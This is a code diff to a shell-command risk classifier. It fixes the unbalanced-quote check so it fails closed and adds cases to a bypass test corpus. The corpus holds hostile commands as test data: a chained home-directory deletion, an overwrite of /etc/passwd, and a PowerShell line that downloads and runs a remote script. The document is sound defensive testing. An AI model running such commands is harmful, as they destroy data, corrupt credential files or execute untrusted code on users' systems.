@@ -20,8 +20,10 @@ export function classifyCommand(command: string, platform: RiskPlatform = proces
   let tier: RiskTier = 0;
 
   if (depth > MAX_DEPTH) return verdict(2, normalized, ["recursive payload depth exceeded"]);
+  // Check quote balance on the RAW command: normalize() strips quotes, so this
+  // must run before normalization is consulted or the fail-closed path is dead.
+  if (hasUnbalancedQuotes(command)) return verdict(2, normalized, ["unparseable command structure"]);
   if (normalized.length === 0) return verdict(0, normalized, []);
-  if (hasUnbalancedQuotes(normalized)) return verdict(2, normalized, ["unparseable command structure"]);
 
   if (hasCommandSubstitution(normalized, platform)) {
     tier = maxTier(tier, 2);
@@ -84,7 +86,9 @@ export const BYPASS_CORPUS: Array<{ command: string; tier: RiskTier; platform: R
   { command: "echo x; rm -rf ~", tier: 2, platform: "posix" },
   { command: "cmd > /etc/passwd", tier: 2, platform: "posix" },
   { command: "iex (iwr http://example.test/p.ps1)", tier: 2, platform: "windows" },
-  { command: "cmd /c del /s C:\\Windows\\Temp\\x", tier: 2, platform: "windows" }
+  { command: "cmd /c del /s C:\\Windows\\Temp\\x", tier: 2, platform: "windows" },
+  { command: "echo 'oops", tier: 2, platform: "posix" },
+  { command: "type C:\\file\" ", tier: 2, platform: "windows" }
 ];
 
 function normalize(command: string): string {
